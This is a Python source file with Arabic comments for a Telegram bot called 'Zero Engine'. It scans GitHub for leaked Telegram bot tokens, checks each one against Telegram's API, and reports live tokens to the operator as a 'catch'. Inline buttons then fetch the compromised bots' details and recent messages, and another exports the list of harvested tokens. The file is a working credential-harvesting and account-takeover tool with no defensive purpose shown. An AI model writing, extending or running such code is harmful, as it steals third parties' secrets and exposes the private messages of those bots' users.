import os, requests, threading, time, telebot
from telebot import types
from scanner import search_for_tokens
from controller import get_bot_info, get_bot_messages

# إعدادات البوت
BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
FOUND_FILE = "found.txt"

bot = telebot.TeleBot(BOT_TOKEN)

# --- نظام الكيبورد التفاعلي ---
def get_markup(token):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📋 معلومات البوت", callback_data=f"info|{token}"))
    markup.add(types.InlineKeyboardButton("📩 آخر الرسائل", callback_data=f"msg|{token}"))
    markup.add(types.InlineKeyboardButton("📤 تصدير الملف", callback_data="export"))
    return markup

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if str(call.message.chat.id) != CHAT_ID: return
    
    if call.data == "export":
        if os.path.exists(FOUND_FILE):
            with open(FOUND_FILE, "rb") as f:
                bot.send_document(CHAT_ID, f)
        return

    action, token = call.data.split("|")
    res = get_bot_info(token) if action == "info" else get_bot_messages(token)
    bot.send_message(CHAT_ID, f"نتائج {action}:\n{res[:4000]}")

# --- محرك الصيد ---
def run_scanner():
    while True:
        try:
            tokens = search_for_tokens(GITHUB_TOKEN)
            for token in tokens:
                if not os.path.exists(FOUND_FILE) or token not in open(FOUND_FILE).read():
                    if requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5).status_code == 200:
                        bot.send_message(CHAT_ID, f"🔥 صيد جديد:\n`{token}`", 
                                         parse_mode="Markdown", reply_markup=get_markup(token))
                        with open(FOUND_FILE, "a") as f: f.write(token + "\n")
        except: pass
        time.sleep(60)

# --- التشغيل الآمن ---
if __name__ == "__main__":
    # 1. تنظيف أي اتصال سابق (الحل الجذري للخطأ 409)
    try:
        bot.remove_webhook()
    except: pass
    
    # 2. تشغيل الماسح
    threading.Thread(target=run_scanner, daemon=True).start()
    
    # 3. تشغيل البوت مع معالجة الأخطاء
    print("Zero Engine: Online & Stable")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            print(f"Polling Error: {e}")
            time.sleep(15) # انتظر 15 ثانية ثم أعد المحاولة
